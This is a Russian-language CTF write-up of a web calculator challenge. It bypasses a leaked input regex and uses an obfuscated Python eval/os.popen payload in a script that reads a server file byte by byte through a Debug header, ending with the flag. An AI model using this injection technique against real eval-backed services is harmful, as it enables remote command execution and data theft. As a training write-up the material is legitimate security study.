# Каликулятар (Web, Medium+) by [rolegiv](https://github.com/rolegiv)  [w33d](https://github.com/w3irdd)

# Задание

![image](https://github.com/rolegiv/CTF-Writeups/assets/147992165/956f4868-2039-4b43-ae2b-a349f05742c1)

# Решение

![image](https://github.com/rolegiv/CTF-Writeups/assets/147992165/1c514f27-8d8e-435e-9bcd-7c5f1d765797)

Видим калькулятор, попробуем туда запихнуть символы вместо цифр, получаем следующий ответ:

![image](https://github.com/rolegiv/CTF-Writeups/assets/147992165/fb6ae338-fc75-42d7-86d6-20b0a78f5903)

Видим из ответа регулярку которая блокирует наш запрос:
**Debug: !~(^(-\d|\d).*\d$|^\d$)**

Можем обойти её следующим образом:
**0 + PAYLOAD + 0**

Теперь пришло время написать скрипт и автоматизировать весь процесс получения флага и главное учесть, что вывод возможен только в виде цифр с калькулятора.

```
import requests
from urllib.parse import urlencode


i = 0
while True:
    payload = f"""
ord(__import__("os").popen("cat flag_is_here.txt").read()[{i}])
""".strip()
    payload = '+'.join(f'chr({ord(i)})' for i in payload)
    payload = f'0+eval({payload})+0'

    data = urlencode({'statement': payload})
    # print('http://91.200.84.50/?'+data)
    response = requests.get('http://91.200.84.50/?'+data)
    try:
        value = float(response.headers.get('Debug'))
        print(chr(int(value)), end='')
    except ValueError:
        print(response.headers.get('Debug'))
        break
    i += 1
```

Полезная нагрузка в скрипте будет payload
```
f"""ord(__import__("os").popen("cat flag_is_here.txt").read()[{i}])""".strip().
```
Строка payload формируется таким образом, чтобы извлечь ASCII-код символа на позиции i в файле flag_is_here.txt.
ord в свою очередь возвращает ASCII-код символа.

```
__import__("os").popen("cat flag_is_here.txt").read() 
```
выполняет команду cat flag_is_here.txt для чтения содержимого файла.

Так же мы кодируем полезную нагрузку в URL:
```
payload = '+'.join(f'chr({ord(i)})' for i in payload)
payload = f'0+eval({payload})+0'
```

Каждая буква в строке payload преобразуется в вызов chr с ASCII-кодом этой буквы.
Эти вызовы объединяются через +, формируя выражение, которое будет интерпретировано на сервере.
Например, если payload был "ord('A')", то он станет "chr(111)+chr(114)+chr(100)+chr(40)+chr(39)+chr(65)+chr(39)+chr(41)".

По итогу мы реализуем следующее:
Отправляется GET-запрос на сервер, содержащим кодированный payload.
Сервер выполняет переданный payload, извлекает соответствующий символ и возвращает его ASCII-код в заголовке Debug.
Значение из заголовка Debug конвертируется в символ и выводится.
Если значение нельзя преобразовать в число, цикл прерывается.
Счетчик i увеличивается, чтобы перейти к следующему символу.
После всех этих манипуляций, мы получаем флаг.

# Флаг
**B0NU${ng1nx_1n7_0v3rfl0w}**



